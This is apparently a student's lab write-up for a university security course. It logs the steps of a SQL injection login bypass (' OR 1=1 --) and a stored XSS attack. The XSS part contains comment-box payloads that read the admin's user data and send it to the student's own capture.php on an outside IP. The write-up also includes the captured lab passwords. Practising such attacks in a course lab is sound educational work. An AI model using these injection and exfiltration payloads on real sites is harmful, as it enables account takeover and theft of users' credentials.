Vincent Chang
6430136
v_chang@umail.ucsb.edu



/*************************
* Task 1 - SQL Injection *
*************************/

*** Secret Password: Mischief Managed ***

Attempts: 
Attempted to use multiple combinations of
  ' OR 1=1 --
and
  ' ; SELECT * FROM Users
within the user field.

After a few combinations, realized that
  ' OR 1=1 --
works within the password field no matter what.

This bypasses the password check and lets you into the system.







/***********************
* Task 2 - XSS Attacks *
***********************/

*** Secret Password: CSS177isStillAwesome ***


Added capture.php to public_html file

I feel like I have to obtain information by using a php script.
  Utilizing the comment box to do so.
Obtain password information.

Attempted to input "http://localhost:8000/~v_chang/capture.php?value=hello"
  as a comment to see if data.txt would be created with "hello" in the
  directory.
  No dice.
  
Attempted the same thing with "http://192.35.222.247/~v_chang/capture.php?value=hello"
  No dice.

Attempted "<script>http://192.35.222.247/~v_chang/capture.php?value=hello</script>"
  Noticed that the comment did not appear on the screen. So the script was run.
  Probably can input the php raw with the script tag and see what happens?
  
The steps for a Stored XSS attack are:
1.) Inject malicious script into the server
2.) Have the admin request content from the server
3.) The admin receives the malicious script
4.) The data is returned to me by the script.

So if I figure out the correct php to run and input into the comment box,
  I can obtain the information from the server when the admin checks the
  comments.

  
  
Can I use javascript to refer to my capture script?

Attempted "<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value=hello"></script>"
  I expected hello to be added to the end of data.txt, and it did after a while.
Test again with "<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value=test"></script>"  
  Worked again. Not immediately. Was logged out when it happened.
  Since it takes a while, it might run the script whenever the admin checks and
  deletes the comments.
  
  
I now need to somehow use it to obtain the admin's password information.
  I can start with just somehow obtaining general information.
  
The user page displays the user and password information.
  Looking at the source of the pt2/comments.php, the user information is
  dynamically filled into the page at the id of "userdata".
  
So I need to modify the destination of the php script to send me the userdata.


Attempted:
<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value=document.getElementById("userdata")"></script>
  in the comment box.
  Once the admin looks at the page, I should be able to see something new in data.txt, if not, I'll try appending .innerHTML.

<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value=document.getElementById("userdata").innerHTML"></script>

  They both appended "document.getElementById(" to data.txt
  Encase it in another script tag?

<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value=<script>document.getElementById("userdata").innerHTML</script>"></script>
  
  Appended: "<script>document.getElementById("
  
Should I modify the PHP file?
  Wrote capture2.php
<?php
  $doc = new DOMDocument();
  $doc->loadHTML($buffer);
  $data = $doc->getElementById('userdata')
  $file = 'data.txt';
  // The new person to add to the file
  //$data = $_GET['value'];
  $data = $data . "\n";
  // Write the contents to the file,
  // using the FILE_APPEND flag to append the content to the end of the file
  // and the LOCK_EX flag to prevent anyone else writing to the file at the same time
  file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
?>
  
Intended to obtain the element by id "userdata" and append that into data.txt

<script type="text/javascript" src="http://192.35.222.247/~v_chang/capture2.php"></script>
  Didn't append anything to data.txt
  
Asked question on Piazza.

Thinking about storing contents if id "userdata" and passing it through as the "value" parameter in the URL

Attempted:
  <script type="text/javascript" src="http://192.35.222.247/~v_chang/capture.php?value="+data>
    var data = document.getElementById("userdata").innerHTML
  </script>
    Returned nothing.
    
    
  <script>
    var data = document.getElementById("userdata").innerHTML
    var i = document.createElement("img");
    i.src = "http://192.35.222.247/~v_chang/capture.php?value="+data;
  </script>
    Returned nothing.
    
    
  <script>
    function myFunction() {
      var data = document.getElementById("userdata").innerHTML
      var x = document.createElement("SCRIPT");
      x.src = "http://192.35.222.247/~v_chang/capture.php?value="+data
      document.body.appendChild(x);
    }
  </script>
  and
  <script>
    var data = document.getElementById("userdata").innerHTML
    var x = document.createElement("SCRIPT");
    x.src = "http://192.35.222.247/~v_chang/capture.php?value="+data
    document.body.appendChild(x);
  </script>
  
  
Obtained:
  admin:CSS177isStillAwesome

Attempted to sign in with:
  Username: admin
  Password: CSS177isStillAwesome

Successfully logged in.

I did it! :)
